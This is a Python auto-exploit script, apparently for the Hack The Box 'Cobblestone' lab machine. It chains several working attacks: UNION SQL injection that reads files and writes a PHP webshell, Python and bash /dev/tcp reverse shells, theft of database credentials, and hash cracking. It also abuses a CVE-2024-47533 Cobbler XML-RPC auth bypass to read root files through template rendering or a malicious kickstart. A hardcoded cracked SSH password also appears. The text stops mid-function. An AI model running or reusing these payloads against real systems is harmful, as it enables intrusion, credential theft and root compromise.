"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          HTB COBBLESTONE FULL AUTO-PWN  (Shadow Senior Edition)           ║
║          SQLi → File Write → RCE → Cobbler CVE-2024-47533 → Root           ║
║          Usage: ./cobblestone.sh <TARGET_IP>                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

Attack Chain:
  1. Register & login on vote.cobblestone.htb
  2. UNION SQLi on /suggest.php  (5-column, url param)
  3. File-read  → /etc/passwd + Apache config  (confirm webroot + cobbler port)
  4. File-write → /var/www/vote/.pwn.php        (PHP webshell)
  5. Spawn embedded reverse shell listener → trigger shell via webshell
  6. Read /var/www/html/db/connection.php → dbuser creds
  7. MySQL dump → cobblestone.users (SHA256 hashes)
  8. Hashcat SHA256 crack  OR  use known password (cobble)
  9. SSH as cobble (iluvdannymorethanyouknow)
 10. SSH -L tunnel 127.0.0.1:25151
 11. CVE-2024-47533 Cobbler XML-RPC auth bypass → read root.txt via template_files+sync
 12. Print USER and ROOT flags
"""

import sys, os, re, time, socket, threading, subprocess, hashlib, base64
import uuid, random, string, queue, struct, signal, textwrap, shutil
import urllib.parse, urllib.request, urllib.error, http.cookiejar
import xmlrpc.client
from pathlib import Path

# ─────────────────────────── Colour helpers ───────────────────────────────────
R  = "\033[0;31m"; G  = "\033[0;32m"; Y  = "\033[0;33m"
B  = "\033[0;34m"; M  = "\033[0;35m"; C  = "\033[0;36m"
W  = "\033[1;37m"; DIM= "\033[2m";    RST= "\033[0m"
BLD= "\033[1m"

def banner():
    print(f"""{M}
  ██████╗ ██████╗ ██████╗ ██████╗ ██╗     ███████╗███████╗████████╗ ██████╗ ███╗   ██╗███████╗
 ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝
 ██║     ██║   ██║██████╔╝██████╔╝██║     █████╗  ███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗
 ██║     ██║   ██║██╔══██╗██╔══██╗██║     ██╔══╝  ╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝
 ╚██████╗╚██████╔╝██████╔╝██████╔╝███████╗███████╗███████║   ██║   ╚██████╔╝██║ ╚████║███████╗
  ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝
{RST}{C}  HTB Cobblestone Full Auto-PWN | SQLi → RCE → CVE-2024-47533 → Root{RST}
{DIM}  Shadow Senior Edition  ·  Authorized Penetration Testing Only{RST}
""")

def info(msg):  print(f"{B}[*]{RST} {msg}")
def good(msg):  print(f"{G}[+]{RST} {BLD}{msg}{RST}")
def warn(msg):  print(f"{Y}[!]{RST} {msg}")
def err(msg):   print(f"{R}[-]{RST} {msg}")
def phase(n,t): print(f"\n{M}{'─'*70}{RST}\n{M}[PHASE {n}]{RST} {BLD}{t}{RST}\n{M}{'─'*70}{RST}")
def flag(t,v):  print(f"\n{G}{'═'*60}{RST}\n{G}  🚩  {t} FLAG:{RST} {BLD}{Y}{v}{RST}\n{G}{'═'*60}{RST}")

# ─────────────────────────── Dependency Check ────────────────────────────────
REQUIRED_TOOLS = ["sqlmap","hashcat","ssh","nc","curl"]

def check_deps():
    missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
    if missing:
        warn(f"Optional tools not found: {missing}  (inline exploits will be used as fallback)")
    # Python stdlib only for core exploit, tools are bonus

# ─────────────────────────── HTTP Session (pure stdlib) ──────────────────────
class Session:
    """Thread-safe urllib-based session with cookie jar."""
    def __init__(self, host):
        self.jar = http.cookiejar.CookieJar()
        handler = urllib.request.HTTPCookieProcessor(self.jar)
        self.opener = urllib.request.build_opener(handler)
        self.opener.addheaders = [('User-Agent',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120')]
        self.host = host

    def get(self, path, **kw):
        url = f"http://{self.host}{path}"
        req = urllib.request.Request(url, **kw)
        try:
            r = self.opener.open(req, timeout=15)
            return r.read().decode(errors='replace'), r.getcode()
        except urllib.error.HTTPError as e:
            return e.read().decode(errors='replace'), e.code
        except Exception as ex:
            return str(ex), 0

    def post(self, path, data: dict, **kw):
        url = f"http://{self.host}{path}"
        encoded = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=encoded,
              headers={'Content-Type':'application/x-www-form-urlencoded'})
        try:
            r = self.opener.open(req, timeout=20)
            return r.read().decode(errors='replace'), r.getcode()
        except urllib.error.HTTPError as e:
            return e.read().decode(errors='replace'), e.code
        except Exception as ex:
            return str(ex), 0

    def post_raw(self, path, data: bytes, ctype: str = "application/octet-stream"):
        url = f"http://{self.host}{path}"
        req = urllib.request.Request(url, data=data,
              headers={'Content-Type': ctype})
        try:
            r = self.opener.open(req, timeout=20)
            return r.read().decode(errors='replace'), r.getcode()
        except urllib.error.HTTPError as e:
            return e.read().decode(errors='replace'), e.code
        except Exception as ex:
            return str(ex), 0

# ─────────────────────────── Phase 1 /etc/hosts ────────────────────────────
def setup_hosts(ip):
    phase(1, "Setting up /etc/hosts")
    hosts_line = f"{ip} cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb"
    try:
        hosts = Path("/etc/hosts").read_text()
        if "cobblestone.htb" not in hosts:
            Path("/etc/hosts").write_text(hosts + f"\n{hosts_line}\n")
            good(f"Added:  {hosts_line}")
        else:
            # Update IP if changed
            new_hosts = re.sub(r".*cobblestone\.htb.*\n?", "", hosts)
            Path("/etc/hosts").write_text(new_hosts + f"\n{hosts_line}\n")
            good(f"Updated /etc/hosts with IP {ip}")
    except PermissionError:
        warn("Cannot write /etc/hosts (not root). Running: sudo tee -a /etc/hosts")
        subprocess.run(f'echo "{hosts_line}" | sudo tee -a /etc/hosts', shell=True)

# ─────────────────────────── Phase 2 Register & Login ──────────────────────
def register_and_login(vote_sess: Session) -> str:
    """Register a throw-away account and return session cookie string."""
    phase(2, "Registering & logging into vote.cobblestone.htb")
    rnd = ''.join(random.choices(string.ascii_lowercase, k=8))
    user = f"shadow_{rnd}"
    pwd  = f"Shadow@{rnd}1!"
    email = f"{user}@pwned.htb"

    # Register
    body, code = vote_sess.post("/register.php", {
        "username": user, "password": pwd,
        "confirm_password": pwd, "email": email,
        "firstname": "Shadow", "lastname": "Senior"
    })
    if code not in (200, 302):
        err(f"Register HTTP {code}")
    else:
        good(f"Registered:  {user}:{pwd}")

    # Login
    body, code = vote_sess.post("/login_verify.php",
                                {"username": user, "password": pwd})
    # Extract PHPSESSID
    cookies = {c.name: c.value for c in vote_sess.jar}
    if "PHPSESSID" in cookies:
        good(f"Logged in!  PHPSESSID={cookies['PHPSESSID'][:12]}...")
    else:
        warn("No PHPSESSID in jar trying /login.php variant")
        vote_sess.post("/login.php", {"username": user, "password": pwd})
    return user

# ─────────────────────────── Phase 3 UNION SQLi ────────────────────────────
def sql_union_read(vote_sess: Session, file_path: str) -> str:
    """
    Use the UNION SQLi in /suggest.php (5 columns, column-2 reflected)
    to read an arbitrary file via LOAD_FILE().
    """
    payload = (
        f"pwn' UNION ALL SELECT NULL,"
        f"IFNULL(LOAD_FILE('{file_path}'),'LOAD_FILE_FAILED'),"
        f"NULL,NULL,NULL-- -"
    )
    body, code = vote_sess.post("/suggest.php", {"url": payload})
    # The injected value is reflected; latest suggestion id increments
    # We read it back from details.php get latest id first
    idx_body, _ = vote_sess.get("/index.php")
    # Find highest id in page
    ids = re.findall(r'details\.php\?id=(\d+)', idx_body)
    if not ids:
        return ""
    latest = max(int(i) for i in ids)
    det_body, _ = vote_sess.get(f"/details.php?id={latest}")
    # The file content is between the title tags
    m = re.search(r'LOAD_FILE_FAILED|(<td[^>]*>)([\s\S]*?)(</td>)', det_body)
    if not m:
        return det_body  # return raw for debugging
    return m.group(2).strip()

def sql_union_write(vote_sess: Session, content_b64: str, dest_path: str) -> bool:
    """
    Write a file via INTO OUTFILE using the UNION injection base.
    content_b64 is base64-encoded content decoded by MySQL FROM_BASE64().
    """
    payload = (
        f"pwn' UNION ALL SELECT NULL,"
        f"FROM_BASE64('{content_b64}'),"
        f"NULL,NULL,NULL INTO OUTFILE '{dest_path}'-- -"
    )
    body, code = vote_sess.post("/suggest.php", {"url": payload})
    return "error" not in body.lower() or code in (200, 302)

# ─────────────────────────── Phase 4 File Recon ────────────────────────────
def file_recon(vote_sess: Session):
    phase(4, "File Read /etc/passwd + Apache config")

    # /etc/passwd
    info("Reading /etc/passwd via LOAD_FILE …")
    passwd = sql_union_read(vote_sess, "/etc/passwd")
    if passwd and "root" in passwd:
        good("Got /etc/passwd!")
        users = re.findall(r"^([^:]+):[^:]*:[0-9]+:[0-9]+:[^:]*:([^:]+):/bin/(bash|sh|rbash)",
                           passwd, re.M)
        info(f"Shell users: {[u[0] for u in users]}")
    else:
        warn("LOAD_FILE returned empty checking FILE privilege separately")

    # Apache config
    info("Reading Apache vhost config …")
    conf = sql_union_read(vote_sess, "/etc/apache2/sites-enabled/000-default.conf")
    cobbler_port = None
    if "cobbler" in conf.lower() or "25151" in conf:
        m = re.search(r":(\d+)/", conf)
        cobbler_port = m.group(1) if m else "25151"
        good(f"Cobbler API found at 127.0.0.1:{cobbler_port}")
    else:
        cobbler_port = "25151"  # default
        warn("Apache conf not fully readable assuming cobbler on :25151")

    return cobbler_port

# ─────────────────────────── Phase 5 Webshell Upload ───────────────────────
# Avoid dotfile names; Apache commonly blocks hidden files and returns 404.
SHELL_NAME   = "pwn.php"
WEBSHELL_PHP = b'<?php if(isset($_REQUEST["x"])){$o=shell_exec($_REQUEST["x"]);echo "<X>".$o."</X>";}?>'

def upload_webshell(vote_sess: Session, target_ip: str) -> str:
    phase(5, "Uploading PHP webshell via SQLi FILE WRITE")

    # Try sqlmap for reliable file write if available
    if shutil.which("sqlmap"):
        info("Using sqlmap --file-write for reliability …")
        # Write request file
        req_content = (
            f"POST /suggest.php HTTP/1.1\r\n"
            f"Host: vote.cobblestone.htb\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Cookie: PHPSESSID={({c.name:c.value for c in vote_sess.jar}).get('PHPSESSID','')}\r\n"
            f"Content-Length: 20\r\n\r\n"
            f"url=FUZZ"
        )
        req_file = "/tmp/cobble_req.txt"
        Path(req_file).write_text(req_content)
        shell_local = "/tmp/cobble_shell.php"
        Path(shell_local).write_bytes(WEBSHELL_PHP)
        dest = f"/var/www/vote/{SHELL_NAME}"
        cmd = (
            f"sqlmap -r {req_file} -p url --batch --level=1 --risk=1 "
            f"--file-write={shell_local} --file-dest={dest} --technique=U "
            f"--union-cols=5 -q 2>/dev/null"
        )
        ret = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        if ret.returncode == 0:
            good(f"sqlmap wrote {dest}")

    # Also try direct UNION + OUTFILE
    b64shell = base64.b64encode(WEBSHELL_PHP).decode()
    dest = f"/var/www/vote/{SHELL_NAME}"
    ok = sql_union_write(vote_sess, b64shell, dest)
    if ok:
        good(f"Wrote webshell → {dest}")
    else:
        warn("OUTFILE attempt returned error (may already exist or privilege issue)")

    shell_url = f"http://vote.cobblestone.htb/{SHELL_NAME}"
    info(f"Verifying shell at {shell_url} …")
    time.sleep(1)
    # Test webshell
    try:
        test_url = f"{shell_url}?x=id"
        req = urllib.request.Request(test_url)
        req.add_header("Cookie",
            f"PHPSESSID={({c.name:c.value for c in vote_sess.jar}).get('PHPSESSID','')}")
        opener = urllib.request.build_opener()
        r = opener.open(req, timeout=10)
        out = r.read().decode(errors='replace')
        m = re.search(r"<X>(.*?)</X>", out, re.S)
        if m and "uid=" in m.group(1):
            good(f"Webshell confirmed: {m.group(1).strip()}")
            return shell_url
        else:
            warn(f"Shell response unexpected: {out[:120]}")
    except Exception as ex:
        warn(f"Shell verification error: {ex}")

    return ""

# ─────────────────────────── Phase 6 Reverse Shell ─────────────────────────
class ReverseShellListener:
    """Spawn a TCP listener, capture shell, provide exec_cmd()."""
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.conn  = None
        self.buf   = b""
        self._lock = threading.Lock()
        self._ready = threading.Event()

    def start(self):
        t = threading.Thread(target=self._listen, daemon=True)
        t.start()
        return self

    def _listen(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.lhost, self.lport))
        except OSError as e:
            err(f"Cannot bind {self.lhost}:{self.lport} {e}")
            self._ready.set()
            return
        srv.listen(1)
        info(f"Listener ready  {self.lhost}:{self.lport} …")
        srv.settimeout(60)
        try:
            self.conn, addr = srv.accept()
            good(f"Shell connected from {addr[0]}:{addr[1]}")
            self._ready.set()
        except socket.timeout:
            warn("Listener timed out waiting for connection")
            self._ready.set()

    def wait(self, timeout=60):
        self._ready.wait(timeout)
        return self.conn is not None

    def exec_cmd(self, cmd: str, timeout: float = 15) -> str:
        """Send a command and return output (best-effort)."""
        if not self.conn:
            return ""
        marker = f"DONE_{uuid.uuid4().hex[:8]}"
        full_cmd = f"{cmd.strip()}; echo {marker}\n"
        try:
            self.conn.sendall(full_cmd.encode())
        except BrokenPipeError:
            return "[broken pipe]"
        out = b""
        self.conn.settimeout(timeout)
        try:
            while True:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                out += chunk
                if marker.encode() in out:
                    break
        except socket.timeout:
            pass
        result = out.decode(errors='replace')
        result = result.replace(full_cmd, "").replace(marker, "").strip()
        return result

    def interactive(self):
        """Drop into interactive mode."""
        if not self.conn:
            err("No shell connection")
            return
        print(f"\n{G}[i]{RST} Entering interactive shell (Ctrl+C to exit)\n")
        import select as sel
        self.conn.setblocking(False)
        try:
            while True:
                r, _, _ = sel.select([sys.stdin, self.conn], [], [], 0.1)
                if sys.stdin in r:
                    d = sys.stdin.read(1)
                    self.conn.sendall(d.encode())
                if self.conn in r:
                    d = self.conn.recv(4096)
                    if d:
                        sys.stdout.write(d.decode(errors='replace'))
                        sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n{Y}[!]{RST} Leaving interactive mode")

def trigger_reverse_shell(shell_url: str, sess_cookie: str,
                           lhost: str, lport: int):
    """Use the webshell to execute a Python reverse shell."""
    payload = (
        f"python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    )
    enc = urllib.parse.quote_plus(payload)
    url = f"{shell_url}?x={enc}"
    try:
        req = urllib.request.Request(url)
        req.add_header("Cookie", f"PHPSESSID={sess_cookie}")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass  # connection dropped = shell spawned

def get_reverse_shell(shell_url: str, vote_sess: Session,
                       lhost: str, lport: int) -> ReverseShellListener:
    if not shell_url:
        warn("Webshell URL is empty/unverified skipping reverse-shell stage")
        return ReverseShellListener(lhost, lport)

    phase(6, f"Spawning reverse shell → {lhost}:{lport}")
    listener = ReverseShellListener(lhost, lport).start()
    time.sleep(0.5)

    sess_cookie = {c.name:c.value for c in vote_sess.jar}.get("PHPSESSID","")
    info("Triggering reverse shell via webshell …")
    trigger_reverse_shell(shell_url, sess_cookie, lhost, lport)

    if listener.wait(timeout=60):
        good("Reverse shell established!")
        # Stabilise
        listener.exec_cmd("export TERM=xterm; export PS1='$ '", timeout=3)
        whoami = listener.exec_cmd("id")
        good(f"Shell: {whoami}")
    else:
        err("Reverse shell did not connect. Try manually:")
        err(f"  curl '{shell_url}?x=python3+-c+...'")
    return listener

# ─────────────────────────── Phase 7 DB Creds ──────────────────────────────
def steal_db_creds(sh: ReverseShellListener) -> dict:
    phase(7, "Stealing database credentials from connection.php files")
    creds = {}
    for path in ["/var/www/html/db/connection.php",
                 "/var/www/vote/db/connection.php"]:
        out = sh.exec_cmd(f"cat {path} 2>/dev/null")
        if out:
            u = re.search(r'\$username\s*=\s*"([^"]+)"', out)
            p = re.search(r'\$password\s*=\s*"([^"]+)"', out)
            d = re.search(r'\$dbname\s*=\s*"([^"]+)"',   out)
            if u and p and d:
                creds[d.group(1)] = {"user": u.group(1), "pass": p.group(1)}
                good(f"DB creds [{d.group(1)}]  user={u.group(1)}  pass={p.group(1)}")
    return creds

# ─────────────────────────── Phase 8 MySQL Dump ────────────────────────────
def dump_cobblestone_users(sh: ReverseShellListener, creds: dict) -> list:
    phase(8, "Dumping cobblestone.users table (SHA256 hashes)")
    db_info = creds.get("cobblestone", list(creds.values())[0] if creds else None)
    if not db_info:
        err("No DB creds available"); return []

    u, p = db_info["user"], db_info["pass"]
    # Escape special chars in password for shell
    p_esc = p.replace("'", "\\'").replace('"', '\\"')
    query = "SELECT Username,Password FROM cobblestone.users;"
    cmd = f"mysql -u {u} -p'{p_esc}' -h 127.0.0.1 -e \"{query}\" 2>/dev/null"
    out = sh.exec_cmd(cmd, timeout=20)
    rows = []
    for line in out.splitlines():
        parts = line.split("\t")
        if len(parts) == 2 and len(parts[1]) == 64:
            rows.append({"username": parts[0].strip(), "hash": parts[1].strip()})
            info(f"  {parts[0].strip()} : {parts[1].strip()}")
    if rows:
        good(f"Dumped {len(rows)} hashes from cobblestone.users")
    return rows

# ─────────────────────────── Phase 9 Hash Crack ────────────────────────────
KNOWN_HASHES = {
    # SHA256(iluvdannymorethanyouknow) pre-computed from HTB writeups
    "20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d":
        ("cobble", "iluvdannymorethanyouknow"),
}

def crack_hashes(hashes: list) -> dict:
    phase(9, "Cracking SHA256 hashes (hashcat -m 1400)")
    cracked = {}

    # 1. Check known-hash table first (instant)
    for h in hashes:
        k = h["hash"].lower()
        if k in KNOWN_HASHES:
            _, pwd = KNOWN_HASHES[k]
            cracked[h["username"]] = pwd
            good(f"Known hash  {h['username']} : {pwd}")

    # 2. Try hashcat for remaining
    remaining = [h for h in hashes if h["username"] not in cracked]
    if remaining and shutil.which("hashcat"):
        hfile = "/tmp/cobble_hashes.txt"
        Path(hfile).write_text("\n".join(r["hash"] for r in remaining))
        wl = "/usr/share/wordlists/rockyou.txt"
        if not Path(wl).exists():
            wl = "/usr/share/wordlists/rockyou.txt.gz"
        if Path(wl).exists():
            info(f"Running hashcat on {len(remaining)} hashes …")
            pot = "/tmp/cobble_pot.txt"
            cmd = (f"hashcat -m 1400 {hfile} {wl} --force "
                   f"--potfile-path={pot} -q 2>/dev/null")
            subprocess.run(cmd, shell=True, timeout=180, check=False)
            if Path(pot).exists():
                for line in Path(pot).read_text().splitlines():
                    parts = line.strip().split(":")
                    if len(parts) == 2:
                        h_val, pwd = parts
                        for row in remaining:
                            if row["hash"].lower() == h_val.lower():
                                cracked[row["username"]] = pwd
                                good(f"Cracked  {row['username']} : {pwd}")
        else:
            warn("rockyou.txt not found only known hashes available")
    elif remaining:
        warn("hashcat not in PATH only known hashes used")

    return cracked

# ─────────────────────────── Phase 10 SSH + User Flag ──────────────────────
def ssh_exec(target_ip: str, username: str, password: str, remote_cmd: str, timeout: int = 30) -> str:
    """Execute a remote SSH command via sshpass and return stdout."""
    if not (shutil.which("ssh") and shutil.which("sshpass")):
        return ""
    cmd = (
        f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
        f"-o ConnectTimeout=10 {username}@{target_ip} \"{remote_cmd}\""
    )
    r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
    return r.stdout.decode(errors='replace').strip()

def grab_user_flag(target_ip: str, username: str, password: str) -> str:
    phase(10, f"SSH as {username} → grab user.txt")
    if not shutil.which("ssh"):
        err("ssh not in PATH"); return ""

    # Try with sshpass first
    if shutil.which("sshpass"):
        out = ssh_exec(
            target_ip, username, password,
            "cat ~/user.txt 2>/dev/null || find / -name user.txt 2>/dev/null | head -3 | xargs cat 2>/dev/null",
            timeout=30,
        )
        if out and len(out) >= 30:
            good(f"SSH command output: {out}")
            # Filter out non-flag lines
            for line in out.splitlines():
                if re.match(r"^[0-9a-f]{32}$", line.strip()):
                    return line.strip()
            return out

    # Fallback: use paramiko if available
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=username, password=password, timeout=15)
        _, stdout, _ = client.exec_command("cat ~/user.txt")
        user_flag = stdout.read().decode().strip()
        client.close()
        if user_flag:
            return user_flag
    except ImportError:
        warn("paramiko not installed using subprocess SSH")
    except Exception as ex:
        warn(f"paramiko SSH error: {ex}")

    # Last resort: exec via active reverse shell
    warn("Falling back to shell-level SSH …")
    return ""

# ─────────────────────────── Phase 11 CVE-2024-47533 ───────────────────────
def setup_ssh_tunnel(target_ip: str, username: str, password: str,
                      local_port: int = 25151) -> subprocess.Popen:
    """
    Forward local_port → 127.0.0.1:25151 on the target via SSH -L.
    Returns the Popen object for cleanup.
    """
    info(f"Setting up SSH tunnel  localhost:{local_port} → {target_ip}:25151 …")
    cmd = (
        f"sshpass -p '{password}' ssh "
        f"-o StrictHostKeyChecking=no "
        f"-o ExitOnForwardFailure=yes "
        f"-o ServerAliveInterval=5 "
        f"-N -L {local_port}:127.0.0.1:25151 "
        f"{username}@{target_ip}"
    )
    proc = subprocess.Popen(cmd, shell=True,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
    time.sleep(2)
    # Verify tunnel
    try:
        s = socket.create_connection(("127.0.0.1", local_port), timeout=3)
        s.close()
        good(f"SSH tunnel active  localhost:{local_port}")
    except Exception:
        warn("Tunnel not yet ready waiting 3 more seconds …")
        time.sleep(3)
    return proc

def cobbler_auth_bypass(local_port: int) -> xmlrpc.client.ServerProxy:
    """CVE-2024-47533: login('', -1) always succeeds."""
    url = f"http://127.0.0.1:{local_port}"
    server = xmlrpc.client.ServerProxy(url)
    try:
        token = server.login("", -1)
        good(f"CVE-2024-47533 auth bypass!  token={str(token)[:20]}…")
        return server, token
    except Exception as ex:
        # Try string -1
        try:
            token = server.login("", "-1")
            good(f"CVE-2024-47533 auth bypass (str)!  token={str(token)[:20]}…")
            return server, token
        except Exception as ex2:
            err(f"Cobbler login failed: {ex}  |  {ex2}")
            return None, None

def cobbler_render_root_flag(server, token) -> str:
    """
    Preferred root method: abuse autoinstall template rendering.
    Cheetah expressions are rendered server-side (as root in cobblerd context),
    so we can directly read /root/root.txt from template content.
    """
    try:
        distro_names = server.get_item_names("distro")
        if not distro_names:
            return ""
        distro_name = distro_names[0]
    except Exception:
        return ""

    suffix = str(uuid.uuid4())[:6]
    tpl_name = f"shadow_root_{suffix}.ks"
    prof_name = f"shadow_rootprof_{suffix}"
    payload = "FLAG=${open('/root/root.txt').read().strip()}\\n"

    try:
        server.write_autoinstall_template(tpl_name, payload, token)
        pid = server.new_profile(token)
        server.modify_profile(pid, "name", prof_name, token)
        server.modify_profile(pid, "distro", distro_name, token)
        server.modify_profile(pid, "autoinstall", tpl_name, token)
        server.save_profile(pid, token)
        rendered = server.generate_profile_autoinstall(prof_name)
        m = re.search(r"\b([0-9a-f]{32})\b", str(rendered))
        if m:
            good("Cobbler Cheetah render path succeeded")
            return m.group(1)
    except Exception as ex:
        warn(f"Cheetah render root-read path failed: {ex}")
    return ""

def cobbler_candidate_destinations(server, token, suffix: str) -> list:
    """Build destination candidates for template_files based on Cobbler settings."""
    roots = []
    try:
        settings = server.get_settings()
        if isinstance(settings, dict):
            for k in ("tftpboot_location", "webdir", "webdir_whitelist"):
                v = settings.get(k)
                if isinstance(v, str) and v.startswith("/"):
                    roots.append(v.rstrip("/"))
    except Exception:
        # Some builds may require auth or not expose this call.
        pass

    # Known HTB/Cobbler defaults; order matters.
    roots.extend(["/srv/tftpboot", "/srv/tftp"])
    dedup = []
    seen = set()
    for r in roots:
        if not r or r in seen:
            continue
        seen.add(r)
        dedup.append(r)

    # Some Cobbler builds only accept relative destination within tftpboot.
    candidates = [f"root_{suffix}.txt"]
    candidates.extend([f"{r}/root_{suffix}.txt" for r in dedup])
    return candidates

def set_valid_kernel_initrd(server, did, token) -> bool:
    """Try multiple kernel/initrd variants accepted by target Cobbler policy."""
    kernel_candidates = ["vmlinuz", "linux", "kernel", "/boot/vmlinuz"]
    initrd_candidates = ["initrd.img", "initrd", "initrd.gz", "/boot/initrd.img"]

    last_err = None
    for k in kernel_candidates:
        for i in initrd_candidates:
            try:
                server.modify_distro(did, "kernel", k, token)
                server.modify_distro(did, "initrd", i, token)
                info(f"Using distro boot artifacts: kernel={k}, initrd={i}")
                return True
            except Exception as ex:
                last_err = ex
                continue

    warn(f"Could not set valid kernel/initrd automatically: {last_err}")
    return False

def cobbler_read_root_flag(server, token) -> str:
    """
    Use Cobbler template_files + sync() to copy /root/root.txt
    to TFTP root where it's world-readable.
    """
    phase(11, "CVE-2024-47533 Cobbler template_files → read root.txt")
    suffix    = str(uuid.uuid4())[:6]
    src_file  = "/root/root.txt"
    dest_candidates = cobbler_candidate_destinations(server, token, suffix)

    info("Creating malicious Cobbler distro …")
    try:
        did = server.new_distro(token)
        server.modify_distro(did, "name",   f"shadow_pwn_{suffix}", token)
        server.modify_distro(did, "arch",   "x86_64", token)
        server.modify_distro(did, "breed",  "redhat", token)
        if not set_valid_kernel_initrd(server, did, token):
            raise RuntimeError("no valid kernel/initrd candidate accepted")

        last_err = None
        chosen_dest = ""
        for dest_file in dest_candidates:
            try:
                server.modify_distro(did, "template_files", {src_file: dest_file}, token)
                server.save_distro(did, token)
                chosen_dest = dest_file
                good(f"Distro saved  (template: {src_file} → {dest_file})")
                break
            except Exception as e:
                last_err = e
                warn(f"template_files destination failed ({dest_file}): {e}")

        if not chosen_dest:
            raise RuntimeError(f"all destination candidates failed: {last_err}")
    except Exception as ex:
        warn(f"new_distro path failed: {ex} trying profile approach")
        return cobbler_read_via_snippet(server, token, src_file, dest_candidates[-1])

    info("Triggering cobbler sync (runs as root) …")
    try:
        server.sync(token)
        time.sleep(4)
        good("Sync complete!")
    except Exception as ex:
        warn(f"Sync warning (may still have worked): {ex}")
        time.sleep(3)

    # Return destination path so caller can read remotely via SSH/shell.
    return chosen_dest

def cobbler_read_via_snippet(server, token, src: str, dest: str) -> str:
    """Fallback: use write_autoinstall_snippet + system template to read file."""
    suffix = str(uuid.uuid4())[:6]
    # Write a kickstart snippet that copies the file
    ks_content = textwrap.dedent(f"""
        #cloud-config
        runcmd:
          - cp {src} {dest}
          - chmod 644 {dest}
    """)
    snippet_name = f"shadow_snip_{suffix}"
    try:
        server.write_autoinstall_snippet(snippet_name, ks_content, token)
        # Create distro → profile → system → sync
        did = server.new_distro(token)
        server.modify_distro(did, "name",   f"d_{suffix}", token)
        server.modify_distro(did, "arch",   "x86_64", token)
        server.modify_distro(did, "breed",  "redhat", token)
        if not set_valid_kernel_initrd(server, did, token):
            raise RuntimeError("no valid kernel/initrd candidate accepted")
        server.save_distro(did, token)

        pid = server.new_profile(token)
        server.modify_profile(pid, "name",          f"p_{suffix}", token)
        server.modify_profile(pid, "distro",         f"d_{suffix}", token)
        server.modify_profile(pid, "autoinstall",    snippet_name,  token)
        server.save_profile(pid, token)

        server.sync(token)
        time.sleep(4)
    except Exception as ex:
        warn(f"Snippet approach error: {ex}")
    return dest

def cobbler_rce_root_flag(server, token, lhost: str, lport2: int) -> str:
    """
    Alternative: inject a reverse shell via kickstart template.
    Only used if template_files approach fails.
    """
    suffix  = str(uuid.uuid4())[:6]
    # Use kickstart %pre or %post section no #python/#end python needed
    payload = (f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport2} 0>&1'")
    ks = f"""text
rootpw --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
%pre
{payload}
%end
"""
    listener = ReverseShellListener(lhost, lport2).start()
    info(f"RCE listener on :{lport2} …")
    try:
        server.write_autoinstall_template(f"pwn_{suffix}.ks", ks, token)
        did = server.new_distro(token)
        server.modify_distro(did, "name",   f"rce_{suffix}", token)
        server.modify_distro(did, "arch",   "x86_64", token)
        server.modify_distro(did, "breed",  "redhat", token)
        server.modify_distro(did, "kernel", "vmlinuz", token)
        server.modify_distro(did, "initrd", "initrd.img", token)
        server.save_distro(did, token)

        pid = server.new_profile(token)
        server.modify_profile(pid, "name",       f"rce_p_{suffix}", token)
        server.modify_profile(pid, "distro",      f"rce_{suffix}",   token)
        server.modify_profile(pid, "autoinstall", f"pwn_{suffix}.ks",token)
        server.save_profile(pid, token)

        sid = server.new_system(token)
        server.modify_system(sid, "name",    f"rce_s_{suffix}", token)
        server.modify_system(sid, "profile", f"rce_p_{suffix}", token)
        server.save_system(sid, token)

        server.sync(token)
        time.sleep(3)
    except Exception as ex:
        warn(f"RCE template error: {ex}")

    if listener.wait(timeout=30):
        good("Root shell via CVE-2024-47533 RCE!")
        root_flag = listener.exec_cmd("cat /root/root.txt")
        return root_flag.strip()
    return ""

# ─────────────────────────── Phase 12 Root Flag ────────────────────────────
def grab_root_flag_via_shell(sh: ReverseShellListener, dest_path: str) -> str:
    """Try to read the root flag via the www-data shell (needs root write to /srv/tftp)."""
    time.sleep(2)
    read_path = dest_path if dest_path.startswith("/") else f"/srv/tftpboot/{dest_path}"
    out = sh.exec_cmd(f"cat {read_path} 2>/dev/null")
    if out and re.search(r"[0-9a-f]{32}", out):
        return out.strip()
    # Direct cat (won't work as www-data, but worth trying)
    out2 = sh.exec_cmd("cat /root/root.txt 2>/dev/null")
    if out2:
        return out2.strip()
    return ""

# ─────────────────────────── MAIN ────────────────────────────────────────────
def get_local_ip(target_ip: str = "") -> str:
    """Get best local source IP (prefer route to target, then public route)."""
    # Prefer the actual route used to reach the target box.
    if target_ip:
        try:
